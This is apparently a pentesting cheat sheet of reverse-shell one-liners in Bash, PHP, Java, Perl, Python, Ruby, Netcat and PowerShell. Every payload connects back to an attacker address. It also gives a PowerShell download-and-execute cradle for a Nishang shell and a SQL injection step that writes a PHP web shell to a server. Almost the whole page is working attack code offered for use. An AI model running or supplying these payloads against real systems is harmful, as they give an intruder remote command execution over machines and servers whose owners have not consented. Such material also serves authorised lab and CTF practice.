If victim is Linux, always run `python3 -c 'import pty; pty.spawn("/bin/bash")'` for interactive shell

## Bash reverse shell
`/bin/bash -i >& /dev/tcp/10.10.17.1/1337 0>&1`

## PHP reverse shell
`php -r '$sock=fsockopen("10.10.17.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'`

If this does not work, you can try replacing &3 with consecutive file descriptors (idk what this mean)

## Java reverse shell
If the target machine uses Java, try the following simple example:

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.17.1/1337;
cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Perl reverse shell
```perl
perl -e 'use Socket;$i="10.10.17.1";$p=1337;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
open(STDOUT,">&S");open(STDERR,">&S");
exec("/bin/sh -i");};'
```

## Python reverse shell
```python
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.17.1",1337));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```

## Ruby reverse shell
```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.17.1","1337");
while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end';
```

or

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.17.1",1337).to_i;
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Netcat reverse shell
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.1 1337 >/tmp/f`

## Powershell reverse shell
`cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .`, `nano Invoke-PowerShellTcp.ps1` and add `Invoke-PowerShellTcp -Reverse -IPAddress <kali ip> -Port <port>` to the bottom of the file. Then, run a python http server on your current folder and `iex (New-Object Net.WebClient).DownloadString("http://<kali ip>:<http server port>/Invoke-PowerShellTcp.ps1")`. This method is best because it can show error messages like permission denied.

or

[encode.py](/docs/appendix/encode-py)

or

```powershell
$sm=(New-Object Net.Sockets.TCPClient("10.10.17.1",1337)).GetStream();
[byte[]]$bt=0..255|%{0};
while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));
$sm.Write($st,0,$st.Length)}
```

## SQL & PHP reverse shell
`select "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE "<php DOCUMENT_ROOT>/webshell.php"` then u can access the webshell by going `http://<url>/webshell.php?c=whoami`

Credit: [Invicti](https://www.invicti.com/learn/reverse-shell)